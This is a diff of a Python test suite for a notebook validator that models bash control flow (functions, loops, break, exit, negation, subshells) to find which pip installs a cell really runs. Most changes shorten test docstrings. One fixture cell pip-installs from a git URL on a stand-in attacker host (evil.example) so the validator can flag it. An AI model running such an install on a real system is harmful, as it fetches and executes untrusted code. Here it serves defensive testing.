+    """An `exit` inside a `{ ...; }` group ends the line, so later commands are not reached."""
     nv = _load_notebook_validator_module()
 
     assert (
@@ -4072,10 +3882,7 @@ def test_a_terminator_inside_a_brace_group_ends_the_line():
 
 
 def test_a_function_body_stays_conditional_past_its_separators():
-    """`setup() { :; pip install ...; }` defines and calls nothing.
-
-    The header sits in the piece that opens the brace, so flagging that piece alone left every
-    LATER command in the body reading as unconditional and R-INST-004 replayed it."""
+    """An uncalled function body runs nothing, so commands past its `;` separators are not replayed."""
     nv = _load_notebook_validator_module()
 
     cell = "!setup() { :; pip install torch==2.12.0 torchcodec==0.10.0; }"
@@ -4109,11 +3916,7 @@ def test_an_escaped_brace_does_not_close_a_parameter_expansion():
 
 
 def test_a_closing_group_hands_its_status_to_the_operator_after_it():
-    """`{ false; } || pip install ...` always reaches the install.
-
-    Verified against bash. The group's own and-or state was popped without folding, so the `||` saw
-    an unknown left side and marked a certain install conditional; R-INST-004 then dropped the
-    pairing."""
+    """`{ false; } || pip install` always reaches the install, since the group's status is folded."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -4129,10 +3932,7 @@ def test_a_closing_group_hands_its_status_to_the_operator_after_it():
 
 
 def test_a_prerelease_window_lands_on_its_minor_not_on_the_prerelease():
-    """`torchcodec~=0.12.0rc1` admits the stable 0.12 line, and pip takes the newest of it.
-
-    PEP 440 sorts 0.12.0rc1 below 0.12, so returning the prerelease as the landing put it under the
-    ABI-stable floor and R-INST-004 rejected a valid upgrade beside torch 2.11."""
+    """A window on a prerelease such as `~=0.12.0rc1` lands on the stable 0.12, not the prerelease."""
     nv = _load_notebook_validator_module()
 
     for spec in ("torchcodec~=0.12.0rc1", "torchcodec>=0.12.0rc1,<0.13"):
@@ -4158,10 +3958,7 @@ def test_a_prerelease_window_lands_on_its_minor_not_on_the_prerelease():
 
 
 def test_an_allowlisted_repository_is_matched_whatever_the_suffix_case():
-    """`unsloth.GIT` is the same repository as `unsloth.git`.
-
-    The suffix was stripped before the host and path were lowered, so `.GIT` stayed on and the
-    lowered `unsloth.git` matched no allowlist entry: a permitted install was reported."""
+    """`unsloth.GIT` matches the allowlisted repository, since the `.git` suffix is case-insensitive."""
     nv = _load_notebook_validator_module()
 
     for spelling in (
@@ -4179,10 +3976,7 @@ def test_an_allowlisted_repository_is_matched_whatever_the_suffix_case():
 
 
 def test_a_group_exits_with_its_list_status_not_its_last_word():
-    """`{ false && pip install x; } || pip install y` always runs the fallback.
-
-    Verified against bash. The group's status was read off the last LEXICAL command, so a command
-    the `&&` had short-circuited spoke for the group and the fallback read as conditional."""
+    """`{ false && pip install x; }` fails, so the `||` fallback after it always runs."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained(
@@ -4200,10 +3994,7 @@ def test_a_group_exits_with_its_list_status_not_its_last_word():
 
 
 def test_a_terminator_behind_a_body_keyword_still_ends_the_line():
-    """`if true; then exit; fi; pip install ...` reaches nothing after the `fi`.
-
-    Verified against bash. The check read the raw piece, which still began with `then`, so the
-    builtin behind it went unseen and a spurious R-INST-001 was reported."""
+    """An `exit` after `then` still ends the shell, so a pip install after the `fi` is never reached."""
     nv = _load_notebook_validator_module()
 
     assert (
@@ -4223,10 +4014,7 @@ def test_a_terminator_behind_a_body_keyword_still_ends_the_line():
 
 
 def test_a_called_function_body_is_replayed():
-    """`setup() { pip install ...; }; setup` definitely installs.
-
-    Leaving every body conditional was safe for the all-path rules but dropped the install from the
-    replay, so the whole-notebook gate skipped R-INST-003/004/005 on a pairing bash performs."""
+    """A called function body is replayed as unconditional, since the call certainly runs its install."""
     nv = _load_notebook_validator_module()
 
     called = "!setup() { pip install torch==2.11.0 torchcodec==0.10.0; }; setup"
@@ -4250,11 +4038,7 @@ def test_a_called_function_body_is_replayed():
 
 
 def test_a_compound_inside_a_function_keeps_every_stack_aligned():
-    """`f() { if true; then pip install x; fi; }; f` must not crash the lint run.
-
-    The body keyword fell through to the no-compound fallback, which grew four of the seven
-    parallel stacks, and the matching `fi` then popped one that was never pushed: an IndexError
-    that aborted the whole notebook lint instead of producing findings."""
+    """A compound inside a function must keep the parser stacks aligned, or the lint raises IndexError."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!f() { if true; then pip install x; fi; }; f") == [
@@ -4269,10 +4053,7 @@ def test_a_compound_inside_a_function_keeps_every_stack_aligned():
 
 
 def test_calling_a_function_enters_its_body_without_clearing_its_guards():
-    """A call makes the body reachable; it does not make a guarded command unguarded.
-
-    `setup() { false && pip install x; }; setup` runs no pip in bash, and flipping every recorded
-    body command to unconditional emitted a spurious R-INST-004."""
+    """Calling a function enters its body without clearing the guards inside it, such as `false &&`."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!setup() { false && pip install torchcodec==0.10.0; }; setup") == [
@@ -4322,10 +4103,7 @@ def test_a_call_made_inside_a_called_function_is_followed():
 
 
 def test_a_break_ends_the_loop_body_it_sits_in():
-    """`while true; do break; pip install x; done` installs nothing.
-
-    Verified against bash: `while true; do break; echo AFTER; done; echo DONE` prints only DONE.
-    `break` is loop-local, unlike `exit`, so the line continues after `done`."""
+    """`break` ends only its loop; the line continues after `done`."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!while true; do break; pip install torchcodec==0.10.0; done") == [
@@ -4347,10 +4125,7 @@ def test_a_break_ends_the_loop_body_it_sits_in():
 
 
 def test_a_break_stays_active_until_its_own_loop_closes():
-    """`while ...; do if ...; then break; fi; pip install x; done` never reaches the install.
-
-    Verified against bash. `break` leaves the innermost LOOP, so tracking the depth of the compound
-    it happens to sit in cleared the jump at the `fi` and replayed the rest anyway."""
+    """A `break` stays in force until its own loop closes, not at the `fi`."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained(
@@ -4382,10 +4157,7 @@ def test_a_return_ends_the_function_body_only():
 
 
 def test_a_call_before_the_definition_reaches_nothing():
-    """Bash reports `f: command not found` for a call written above `f()`.
-
-    The replay matched on the name alone, so a body defined later was marked unconditional by a
-    call that never found it."""
+    """Bash reports `f: command not found` for a call written above `f()`, so it runs nothing."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!f || true; f() { pip install torchcodec==0.10; }") == [
@@ -4399,10 +4171,7 @@ def test_a_call_before_the_definition_reaches_nothing():
 
 
 def test_calling_a_function_that_ends_the_shell_ends_the_caller():
-    """`f() { exit; }; f; pip install x` never reaches the install.
-
-    Verified against bash. The terminator is conditional while `f` is only a definition, so the
-    hand-over has to be applied when the call is resolved, not where it was scanned."""
+    """Calling a function that runs `exit` ends the shell, so a later install never runs."""
     nv = _load_notebook_validator_module()
 
     assert nv._split_chained("!f() { exit; }; f; pip install torchcodec==0.10") == [
@@ -4418,10 +4187,7 @@ def test_calling_a_function_that_ends_the_shell_ends_the_caller():
 
 
 def test_a_call_carries_its_body_status_into_the_and_or_list():
-    """`f() { pip install x; }; f && pip install y` reaches the second install.
-
-    A call exits with its body's status, and recording only the name left the `&&` reading an
-    unknown left side, so the pair R-INST-004 compares never both appeared."""
+    """A call exits with its body's status, so the `&&` after `f` reaches the next install."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -4439,10 +4205,7 @@ def test_a_call_carries_its_body_status_into_the_and_or_list():
 
 
 def test_a_literal_for_list_runs_its_body():
-    """`for x in a b; do ...; done` iterates, so the body is reached like a bare command.
-
-    An expansion or a glob may produce nothing, and turning either into a certainty would be a
-    guess, so only a literal list counts."""
+    """A `for` loop over a literal word list runs its body; expansions and globs may yield nothing."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -4459,10 +4222,7 @@ def test_a_literal_for_list_runs_its_body():
 
 
 def test_python_dash_c_terminates_the_option_list():
-    """`python -cpass -m pip ...` runs `pass`; the rest are script arguments.
-
-    Verified locally: the command produces no pip output. `python --help` documents `-c cmd` as
-    "program passed in as string (terminates option list)"."""
+    """`python -c` ends the option list, so the rest are script arguments and `-m pip` is not run."""
     nv = _load_notebook_validator_module()
 
     for cell in (
@@ -4480,10 +4240,7 @@ def test_python_dash_c_terminates_the_option_list():
 
 
 def test_a_call_uses_the_definition_in_force_at_that_point():
-    """`f(){ a; }; f; f(){ b; }` calls the FIRST body, not the last one written.
-
-    Keying the replay by name compared the call against the final definition, so the body bash
-    really runs stayed conditional."""
+    """A call runs the definition in force at that point, not a later one with the same name."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -4499,10 +4256,7 @@ def test_a_call_uses_the_definition_in_force_at_that_point():
 
 
 def test_the_negation_word_survives_a_separator():
-    """`! false` succeeds, so an `&&` behind it runs; `! true` fails, so it does not.
-
-    Verified against bash. Reconstructing a non-head command glued the notebook's bang to bash's
-    negation, and the pipeline whose status it inverts was read as a command name."""
+    """A `!` negation survives a separator, so in `! false && pip install` the `&&` still runs."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -4532,10 +4286,7 @@ def test_a_subshell_hands_over_its_folded_status():
 
 
 def test_an_external_wrapper_does_not_reach_a_shell_function():
-    """`env f` looks for an executable named f; bash reports "No such file or directory".
-
-    Stripping every execution prefix before resolving the name made each wrapper look like a call,
-    and entering the body let its `exit` truncate a line bash carries on with."""
+    """`env f` looks for an external program named f, so a function's `exit` is not reached."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -4569,10 +4320,7 @@ def test_a_terminating_call_in_a_subshell_spares_the_parent():
 
 
 def test_break_outside_a_loop_drops_nothing():
-    """Bash rejects `break` outside a loop and runs the next command anyway.
-
-    Verified locally: `if true; then break; echo AFTER_BREAK; fi` prints AFTER_BREAK after
-    reporting "break: only meaningful in a `for', `while', or `until' loop"."""
+    """Bash rejects `break` outside a loop, and the next command still runs, so nothing is dropped."""
     nv = _load_notebook_validator_module()
 
     assert [
@@ -4588,11 +4336,7 @@ def test_break_outside_a_loop_drops_nothing():
 
 
 def test_the_pip_success_assumption_never_makes_a_path_unreachable():
-    """Reporting an install on the pip-succeeds model is intended; CUTTING a path is not.
-
-    `if ! pip install x; then ...` runs its body whenever that install fails, and `pip install x &&
-    exit` reaches the next command for the same reason. Both were being dropped, so R-INST-001
-    missed a source bash can reach."""
+    """The pip-success assumption must not cut a path, as `if ! pip install x` runs when it fails."""
     nv = _load_notebook_validator_module()
 
     for cell in (
@@ -4611,10 +4355,7 @@ def test_the_pip_success_assumption_never_makes_a_path_unreachable():
 
 
 def test_an_uncalled_function_body_is_unreachable_not_conditional():
-    """`f(){ pip install git+...; }` defines f and stops; nothing in it can run.
-
-    The all-path rules deliberately read conditional commands, so emitting an uncalled body as
-    merely conditional reported a source the cell can never install."""
+    """An uncalled function body can never run, so a git source in it is not reported as conditional."""
     nv = _load_notebook_validator_module()
 
     assert (
@@ -4639,10 +4380,7 @@ def test_an_uncalled_function_body_is_unreachable_not_conditional():
 
 
 def test_a_shell_local_prefix_still_reaches_a_function():
-    """`A=1 f` and the reserved word `time f` call f; `env f` and `nohup f` do not.
-
-    Verified against bash: both of the first two print the body. Rejecting every prefixed command
-    left a called body conditional and the compatibility replay saw only half a pair."""
+    """`A=1 f` and the `time` keyword still call the function f, unlike `env f` or `nohup f`."""
     nv = _load_notebook_validator_module()
 
     for cell in ("!f(){ pip install a; }; time f", "!f(){ pip install a; }; A=1 f"):
@@ -4658,11 +4396,7 @@ def test_a_shell_local_prefix_still_reaches_a_function():
 
 
 def test_an_upgrade_under_a_ceiling_stays_in_the_line_it_is_in():
-    """`--upgrade "x<0.12"` over an installed 0.11 cannot leave 0.11.
-
-    An upgrade does not go backwards and the ceiling bars anything above, so the minor is
-    determinate even though no floor is written. Reporting it unknown hid a pairing every release
-    the window admits breaks."""
+    """An upgrade under a ceiling cannot go below the installed minor, so that minor is known."""
     nv = _load_notebook_validator_module()
 
     cell = '!pip install --upgrade "torch==2.12" "torchcodec<0.12"'
@@ -4679,10 +4413,7 @@ def test_an_upgrade_under_a_ceiling_stays_in_the_line_it_is_in():
 
 
 def test_an_uninstall_is_matched_on_the_canonical_project_name():
-    """PEP 503 makes `huggingface_hub` and `huggingface-hub` one project.
-
-    The Colab snapshot is keyed the second way, so popping the spelling as written left the removed
-    package in the resolved set and the rules judged a version the cell deleted."""
+    """PEP 503 makes `huggingface_hub` and `huggingface-hub` one project, so uninstall matches both."""
     nv = _load_notebook_validator_module()
 
     colab = {"huggingface-hub": "1.2.0", "torch": "2.11.0", "python": "3.13.15"}
@@ -4696,10 +4427,7 @@ def test_an_uninstall_is_matched_on_the_canonical_project_name():
 
 
 def test_a_marker_false_reinstall_does_not_put_a_package_back():
-    """pip skips a requirement whose marker excludes the interpreter.
-
-    Counting one as an install reset the removal, and the rule that fires on a missing tokenizers
-    went quiet on a notebook that really had removed it."""
+    """pip skips a requirement whose marker excludes the interpreter, so it cannot undo an uninstall."""
     nv = _load_notebook_validator_module()
 
     colab = {"python": "3.13.15"}
@@ -4710,10 +4438,7 @@ def test_a_marker_false_reinstall_does_not_put_a_package_back():
 
 
 def test_a_project_name_is_canonicalized_the_way_pep_503_says():
-    """Any run of `-`, `_` or `.` is one separator to pip.
-
-    Folding only underscores let `pip uninstall huggingface.hub` leave the hyphenated snapshot
-    entry in place, and the rules judged a version the cell had removed."""
+    """Any run of `-`, `_` or `.` is one separator, so `huggingface.hub` matches the hyphenated entry."""
     nv = _load_notebook_validator_module()
 
     colab = {"huggingface-hub": "1.2.0", "torch": "2.11.0", "python": "3.13.15"}
@@ -4754,10 +4479,7 @@ def test_a_group_behind_a_keyword_is_still_unwrapped():
 
 
 def test_a_closed_subshell_keeps_the_failure_it_folded():
-    """`(false && true)` exits 1, so bash never reaches the `&&` behind it.
-
-    The close had already folded the group's status, and re-reading the text in hand picked up its
-    last lexical `true` and replayed an install that cannot run."""
+    """A closed `( ... )` keeps its failure, so `(false && true) && pip install` never runs pip."""
     nv = _load_notebook_validator_module()
 
     assert ("!pip install torch==2.11.0", True) in nv._split_chained(
@@ -4772,10 +4494,7 @@ def test_a_closed_subshell_keeps_the_failure_it_folded():
 
 
 def test_break_and_continue_take_the_level_they_name():
-    """`break 2` leaves the enclosing loop as well, so the outer body stops too.
-
-    Binding every jump to the innermost loop let the outer loop's remaining commands replay as
-    reached, and a pin bash never installs raised a compatibility finding."""
+    """`break 2` also leaves the outer loop, so its later commands are never replayed."""
     nv = _load_notebook_validator_module()
 
     outer = "!for x in a; do for y in b; do %s; done; pip install torch==2.11; done"
@@ -4787,10 +4506,7 @@ def test_break_and_continue_take_the_level_they_name():
 
 
 def test_a_substitution_reaches_a_function_its_parent_defined():
-    """A command substitution runs with the functions the parent shell already has.
-
-    The recursive parse cannot see the definition, so an uncalled-looking body was dropped while
-    bash ran the install inside it."""
+    """A `$( )` runs with the parent shell's functions, so an install inside it is still found."""
     nv = _load_notebook_validator_module()
 
     cell = "!f(){ pip install git+https://evil.example/x.git; }; echo $(f)"
@@ -4804,10 +4520,7 @@ def test_a_substitution_reaches_a_function_its_parent_defined():
 
 
 def test_a_condition_that_fails_whatever_pip_does_stays_known():
-    """`if false && pip install x` is known to fail, so its `else` certainly runs.
-
-    Marking the condition assumed merely because pip appears in it turned that certainty into a
-    guess, and the install bash always performs dropped out of the replay."""
+    """`if false && pip install` is known to fail, so its `else` certainly runs."""
     nv = _load_notebook_validator_module()
 
     for cell in (
@@ -4844,10 +4557,7 @@ def test_a_path_qualified_prefix_runs_the_same_program():
 
 
 def test_a_literal_return_status_propagates_out_of_a_function():
-    """`help return`: `return N` exits the function with N.
-
-    Reading it as unknown left `setup() { return 0; }; setup && pip install ...` conditional and
-    dropped an install that always runs."""
+    """`return 0` fixes the function's exit status, so `setup && pip install` always runs the install."""
     nv = _load_notebook_validator_module()
 
     assert ("!pip install torch==2.11", False) in nv._split_chained(
@@ -4863,10 +4573,7 @@ def test_a_literal_return_status_propagates_out_of_a_function():
 
 
 def test_a_prerelease_sorts_below_the_release_it_leads_up_to():
-    """PEP 440 puts `0.12.0rc1` under `0.12.0`, and `dev` under `a` under `b` under `rc`.
-
-    Reading the suffix's digits as another release component sorted the candidate ABOVE its own
-    release, so a floor the cell upgrades past looked already met."""
+    """PEP 440 sorts `0.12.0rc1` below `0.12.0`, not above it as its digits suggest."""
     nv = _load_notebook_validator_module()
 
     assert nv.cmp_versions("0.12.0rc1", "0.12.0") == -1
@@ -4884,10 +4591,7 @@ def test_a_prerelease_sorts_below_the_release_it_leads_up_to():
 
 
 def test_a_negation_covers_the_whole_pipeline():
-    """Bash negates a pipeline's status, not its first command's.
-
-    `! true | false` succeeds, so the `&&` behind it runs; losing the `!` at the pipe read every
-    one of these backwards."""
+    """A `!` negates the whole pipeline's status, so `! true | false && pip install` runs the install."""
     nv = _load_notebook_validator_module()
 
     runs = ("!! true | false && pip install a", "!true | true && pip install a")
@@ -4937,10 +4641,7 @@ def test_a_landing_pinned_to_an_excluded_release_names_nothing():
 
 
 def test_a_prerelease_landing_is_promoted_only_where_the_release_is_admitted():
-    """`>=0.12.0a1,<0.12.0rc1` stops below every stable 0.12.
-
-    Promoting the landing to `0.12.0` there cleared an ABI floor the installed codec is under, so
-    R-INST-004 took the ABI-stable short circuit on a prerelease."""
+    """A window that stops below every stable 0.12 must not promote its prerelease landing to `0.12.0`."""
     nv = _load_notebook_validator_module()
 
     assert nv._effective_version(
@@ -4952,10 +4653,7 @@ def test_a_prerelease_landing_is_promoted_only_where_the_release_is_admitted():
 
 
 def test_a_marker_term_the_oracle_cannot_answer_is_only_one_term():
-    """A decisive `false and unknown` is still false.
-
-    Bailing out on any unavailable field replayed a pin pip certainly skips, and R-INST-004
-    reported an incompatibility against a compatible baseline."""
+    """`false and unknown` is still false, so an unavailable marker field must not void the check."""
     nv = _load_notebook_validator_module()
 
     environment = nv._marker_environment({"python": "3.13.15"})
@@ -4980,10 +4678,7 @@ def test_a_marker_term_the_oracle_cannot_answer_is_only_one_term():
 
 
 def test_a_quoted_loop_word_is_one_literal_iteration():
-    """`for x in '*'` iterates over a literal star, so its body certainly runs.
-
-    Reading the raw word treated the quoted glob as possibly empty and dropped the install from the
-    replay."""
+    """A quoted '*' is one literal iteration, not a possibly empty glob, so the body always runs."""
     nv = _load_notebook_validator_module()
 
     assert ("!pip install torch==2.11.0", False) in nv._split_chained(
